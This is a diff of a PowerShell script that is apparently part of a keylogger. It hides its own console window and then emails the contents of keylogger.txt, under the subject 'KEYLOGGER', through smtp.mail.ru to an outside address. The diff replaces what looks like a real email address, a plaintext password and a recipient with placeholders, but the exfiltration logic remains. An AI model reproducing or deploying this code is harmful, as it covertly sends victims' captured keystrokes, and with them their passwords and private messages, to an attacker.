@@ -1,10 +1,10 @@
 $t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
 add-type -name win -member $t -namespace native
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-$Myemail="alena.petroshevich@mail.ru"
-$Mypass="uTdUXdnR3sNxwQyAANcv"
+$Myemail="..."
+$Mypass="..."
 $SMTP="smtp.mail.ru"
-$To="urina.linforyt@gmail.com"
+$To="..."
 $Subject="KEYLOGGER"
 $Body=Get-Content -Path keylogger.txt -Raw
 $SecurePassword=Convertto-SecureString -String $Mypass -AsPlainText -force
